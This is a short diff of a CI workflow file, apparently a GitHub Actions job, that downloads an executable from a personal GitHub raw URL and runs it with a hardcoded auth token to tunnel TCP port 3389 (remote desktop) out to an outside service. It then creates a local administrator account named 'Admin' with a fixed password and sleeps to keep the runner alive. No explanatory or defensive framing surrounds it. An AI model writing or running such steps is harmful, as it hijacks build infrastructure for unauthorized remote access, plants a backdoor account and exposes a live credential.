@@ -12,8 +12,8 @@ jobs:
     - name: rrt
       run: |
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe" -OutFile use.exe 
-           cmd /c zip.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
-           start /B zip.exe tcp 3389
+           cmd /c use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+           start /B use.exe tcp 3389
            cmd /c net user /add Admin P@ssw0rd.
            cmd /c net localgroup /add administrators Admin
            sleep 120
